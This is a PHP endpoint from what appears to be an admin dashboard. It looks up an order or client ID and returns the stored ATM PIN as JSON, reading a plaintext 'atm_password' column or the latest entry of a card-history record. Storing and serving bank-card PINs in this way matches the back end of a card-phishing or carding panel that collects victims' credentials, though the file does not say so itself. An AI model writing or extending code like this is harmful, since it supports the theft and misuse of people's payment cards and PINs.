<?php
declare(strict_types=1);
require_once __DIR__ . '/init.php';

$orderId = (int) ($_GET['order_id'] ?? 0);
if ($orderId > 0) {
    if (!function_exists('dashboard_pdo')) {
        echo json_encode([]);
        exit;
    }
    try {
        $pdo = dashboard_pdo();
        $st = $pdo->prepare(
            'SELECT id, atm_password, created_at, card_history_json FROM orders WHERE id = ? LIMIT 1'
        );
        $st->execute([$orderId]);
        $o = $st->fetch(PDO::FETCH_OBJ);
        if ($o) {
            $pin = \trim((string) ($o->atm_password ?? ''));
            if ($pin !== '') {
                echo \json_encode([
                    'pin_code' => $pin,
                    'created_at' => (string) $o->created_at,
                ], JSON_UNESCAPED_UNICODE);
                exit;
            }
            $ch = (string) ($o->card_history_json ?? '');
            if ($ch !== '' && \is_array($dec = \json_decode($ch, true)) && \count($dec) > 0) {
                $last = \end($dec);
                if (\is_array($last) && \trim((string) ($last['atm'] ?? '')) !== '') {
                    echo \json_encode([
                        'pin_code' => (string) $last['atm'],
                        'created_at' => (string) ($last['saved_at'] ?? $o->created_at),
                    ], JSON_UNESCAPED_UNICODE);
                    exit;
                }
            }
        }
    } catch (Throwable $e) {
    }
    echo \json_encode([]);
    exit;
}

$clientId = (int) ($_GET['client_id'] ?? 0);
if ($clientId < 1) {
    echo \json_encode([]);
    exit;
}

$pin = $User->fetchLastPinByClientId($clientId);
echo \json_encode($pin ?: [], JSON_UNESCAPED_UNICODE);
